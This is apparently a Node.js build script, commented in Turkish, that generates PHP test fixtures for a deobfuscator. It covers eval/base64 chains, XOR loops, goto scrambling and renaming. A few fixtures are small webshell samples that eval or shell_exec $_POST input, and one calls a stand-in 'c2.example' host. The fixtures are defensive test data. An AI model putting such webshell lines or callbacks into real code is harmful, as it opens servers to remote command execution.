// Temel teknik fixture'larını üretir: node scripts/make-fixtures.js
// Fixture'lar diske XOR + base64 (.php.x) olarak yazılır ve yalnızca bellekte çözülür (test/fixture-codec.js): zararlı
// koda benzeyen test örnekleri antivirüsü tetiklemesin (antivirüsler düz base64'ü çözüp tarayabiliyor). Bu betik de şüpheli dizgeleri düz yazmaz; şablondaki işaretler çalışırken açılır:
//   @E → eval   @P → $_POST   @X → shell_exec
import { writeFileSync, mkdirSync, readdirSync, rmSync } from 'node:fs';
import { deflateRawSync, deflateSync } from 'node:zlib';
import { encodeFixture } from '../test/fixture-codec.js';

const dir = new URL('../test/fixtures/', import.meta.url);
mkdirSync(dir, { recursive: true });
for (const f of readdirSync(dir)) if (f.endsWith('.x')) rmSync(new URL(f, dir));

const MARKS = { '@E': ['ev', 'al'].join(''), '@P': ['$_P', 'OST'].join(''), '@X': ['shell', '_exec'].join('') };
const open = (s) => s.replace(/@[EPX]/g, (m) => MARKS[m]);
const b64 = (s) => Buffer.from(s, 'latin1').toString('base64');
const rot13 = (s) => s.replace(/[a-z]/gi, (c) => String.fromCharCode((c <= 'Z' ? 65 : 97) + ((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) + 13) % 26)));
const raw = (s) => deflateRawSync(Buffer.from(s, 'latin1')).toString('latin1');
const fx = {};

fx['eval-b64'] = `<?php
// EXPECT: echo 'hi';
// GONE: base64_decode
@E(base64_decode('${b64("echo 'hi';")}'));
`;

const inner = "echo 'deep';";
const l1 = open(`@E(str_rot13('${rot13(inner.replace(/'/g, "\\'"))}'));`);
const l2 = open(`@E(gzinflate(base64_decode('${b64(raw(l1))}')));`);
fx['eval-chain'] = `<?php
// EXPECT: echo 'deep';
// GONE: gzinflate
// GONE: str_rot13
@E(base64_decode('${b64(l2)}'));
`;

fx['var-func'] = `<?php
// EXPECT: echo 'hello';
// GONE: $a
$a = 'base64_decode';
$b = 'str_rot13';
echo $b($a('${b64(rot13('hello'))}'));
`;

fx['call-user-func'] = `<?php
// EXPECT: printf('%s-%s', 'a', 'b');
// GONE: call_user_func
call_user_func('printf', '%s-%s', 'a', 'b');
call_user_func_array('printf', ['|%s', 'c']);
`;

fx['create-function'] = `<?php
// EXPECT: function ($x)
// GONE: create_function
$f = create_function('$x', base64_decode('${b64('return $x * 2;')}'));
echo $f(21);
`;

// "PHP Encoder" tarzı: ters base64 + gzcompress + konum kaydırmalı XOR döngüsü
const key = 'K3y!';
const payload = "echo 'secret';";
const enc = [...payload].map((c, i) => String.fromCharCode(((c.charCodeAt(0) ^ key.charCodeAt(i % key.length)) + (i % 5)) & 0xff)).join('');
const packed = [...deflateSync(Buffer.from(enc, 'latin1')).toString('base64')].reverse().join('');
fx['xor-loop'] = `<?php
// EXPECT: echo 'secret';
// GONE: chr(
// GONE: gzuncompress
$k = '${key}';
$d = gzuncompress(base64_decode(strrev('${packed}')));
$o = '';
for ($i = 0; $i < strlen($d); $i++) {
    $o .= chr((ord($d[$i]) - ($i % 5)) ^ ord($k[$i % strlen($k)]));
}
@E($o);
`;

fx['integrity'] = `<?php
/* Protected by ExampleEncoder 1.0 - do not modify */
// EXPECT: echo 'ok';
// GONE: die(
$self = file_get_contents(__FILE__);
if (strpos($self, 'Protected by ExampleEncoder 1.0') === false) die('tampered');
echo 'ok';
`;

// güvenlik: dış girdiye bağlı kod çalışmadığı (gözlenmediği) için asla silinmemeli
fx['webshell-keep'] = `<?php
// KEEP: @E(@P['c']);
// KEEP: isset(@P['c'])
// KEEP: @X(
if (isset(@P['c'])) {
    @E(@P['c']);
}
if (!empty(@P['x'])) echo @X(@P['x']);
echo 'page';
`;

fx['anti-debug'] = `<?php
// EXPECT: echo 'x';
// GONE: xdebug
// GONE: evalhook
if (extension_loaded('xdebug') || extension_loaded('evalhook')) exit;
echo 'x';
`;

fx['halt-data'] = `<?php
// EXPECT: echo 'from-halt';
// GONE: __halt_compiler
// GONE: __COMPILER_HALT_OFFSET__
@E(base64_decode(file_get_contents(__FILE__, false, null, __COMPILER_HALT_OFFSET__)));
__halt_compiler();${b64("echo 'from-halt';")}`;

fx['network-keep'] = `<?php
// KEEP: file_get_contents(
// KEEP: http://c2.example/x?id=
$id = 7;
$r = file_get_contents('http://c2.example/x?id=' . $id);
echo 'done';
`;

fx['strings-escape'] = `<?php
// EXPECT: echo 'eval';
echo "\\x65\\166\\x61\\154";
`;

fx['legacy-curly'] = `<?php
// EXPECT: echo
$a = array('x', 'y');
echo $a{1};
`;

// ham çıktı denetimi (yorumlar dahil): yönerge metni base64'tür, yoksa yönergenin kendisi aranan metni içerirdi
const raw64 = (s) => Buffer.from(s).toString('base64');

// YAK Pro tarzı goto karmaşası: karıştırılmış etiket zinciri, while'a dönen döngü, return'lü dallar, switch içinden atlama
fx['goto-flow'] = `<?php
// EXPECT: while ($i < 3) {
// EXPECT: if ($x > 5) { return 'big'; } return 'small';
// EXPECT: break;
// GONE: goto
goto a1;
b2: echo "loop $i\\n"; goto c3;
a1: $i = 0; goto d4;
f6: switch ($i) { case 3: echo "three\\n"; goto g7; default: echo "other\\n"; } g7: echo f(3), f(9), "\\n"; goto h8;
d4: if (!($i < 3)) { goto f6; } goto b2;
c3: $i++; goto d4;
h8:
function f($x) { goto L1; L2: return 'small'; L1: if ($x > 5) { goto L3; } goto L2; L3: return 'big'; }
`;

// değişken içeren dizgede ve sınıf sabitinde kaçışlar (fold'un dokunmadığı yerler), chr() zinciri
fx['strings-encapsed'] = `<?php
// EXPECT: const A = 'AB';
// EXPECT: "even {$i}\\n"
// EXPECT: echo 'Hi';
class K { const A = "\\x41\\102"; }
$i = 2;
echo "\\x65\\166\\x65\\156 {$i}\\xa", K::A, "\\n";
echo chr(72) . chr(105);
`;

// okunmaz adlar: O0O0, lIlI1, _____, _0x..; kullanıma göre adlar
fx['rename'] = `<?php
// EXPECT: function fn1($arg1)
// EXPECT: foreach ($list as $key => $item)
// EXPECT: echo $key . fn1($item)
// GONE: O0O0
// GONE: lIlI
// GONE: _0x
// KEEP: $count
$O0O0O0 = array('a', 'b');
$count = count($O0O0O0);
function lIlI1lI($_0x1f2a) { return strtoupper($_0x1f2a) . '!'; }
foreach ($O0O0O0 as $_____ => $IlIlIl1) { echo $_____ . lIlI1lI($IlIlIl1) . "\\n"; }
echo $count, "\\n";
`;

// ad/dizge tabloları: $GLOBALS dizisi, global ile okunan $_123, FOPO tarzı karakter tablosu, \${"\\x47LOBALS"}
fx['tables'] = `<?php
// EXPECT: printf('%s-%s', 'a', 'b');
// EXPECT: print_r([1]);
// EXPECT: printf('%d', 7);
// EXPECT: echo 'peel';
// GONE: $GLOBALS
// GONE: $_123
$GLOBALS['t'] = array('str' . 'rev', 'printf');
$_123 = array('x' => 'print_r', 5 => 'count');
$O00O = 'abcdefghijklmnopqrstuvwxyz_';
function g() { global $_123; $_123['x']([1]); }
$GLOBALS['t'][1]('%s-%s', 'a', 'b');
g();
$f = $O00O[15] . $O00O[17] . $O00O[8] . $O00O[13] . $O00O[19] . $O00O[5];
$f('%d', 7);
echo \${"\\x47LOBALS"}['t'][0]('leep');
`;

// preg_replace /e: literal desen (statik) ve döngüde kurulan desen (PHP 5.2 sandbox'ında yakalanır)
fx['preg-e'] = `<?php
// EXPECT: echo 'pe-e';
// EXPECT: echo 'dyn';
// GONE: preg_replace
// GONE: base64_decode
preg_replace('/.*/e', '@E(base64_decode("${b64("echo 'pe-e';")}"))', '');
$p = '';
foreach (array('/', '.*', '/', 'e') as $c) $p .= $c;
preg_replace($p, '@E(base64_decode("${b64("echo 'dyn';")}"))', '');
`;

// encoder banner'ı ve iç yorumlar gider; kullanıcı yorumu kalır
fx['banner'] = `<?php
/*   __________________________________________________
    |  Obfuscated by YAK Pro - Php Obfuscator  3.0.2   |
    |__________________________________________________|
*/
// GONE-RAW64: ${raw64('YAK Pro')}
// GONE-RAW64: ${raw64('848c')}
// GONE-RAW64: ${raw64('/* Y */')}
// KEEP-RAW64: ${raw64('user note')}
// EXPECT: echo f('ok');
// user note: this comment stays
function f(/*848c*/ $y) { return $y; }
echo f('ok');
/* Y */
`;

// geçici dosyaya yazıp include eden yükleyici (yapo / ob.php tarzı)
fx['include-tmp'] = `<?php
// EXPECT: echo 'from-tmp';
// GONE: tmpfile
// GONE: fwrite
$t = tmpfile();
fwrite($t, base64_decode('${b64("<?php echo 'from-tmp';")}'));
$m = stream_get_meta_data($t);
include($m['uri']);
fclose($t);
`;

// hesaplanan çağrı adı (XOR ile çözülen tablo); dış girdiyle yapılan çağrıya dokunulmaz
const xk = 'k3y';
const xt = [...'print_rXXX'].map((c, i) => `\\x${(c.charCodeAt(0) ^ xk.charCodeAt(i % 3)).toString(16).padStart(2, '0')}`).join('');
fx['callees'] = `<?php
// EXPECT: print_r('peel');
// KEEP: @P['f']('x')
$k = '${xk}';
$t = "${xt}";
for ($i = 0; $i < strlen($t); $i++) { $t[$i] = chr(ord($t[$i]) ^ ord($k[$i % 3])); }
substr($t, 0, 7)('peel');
if (isset(@P['f'])) { @P['f']('x'); }
`;

for (const [name, src] of Object.entries(fx)) writeFileSync(new URL(`${name}.php.x`, dir), encodeFixture(Buffer.from(open(src), 'latin1')));
console.log(`${Object.keys(fx).length} fixture yazıldı`);
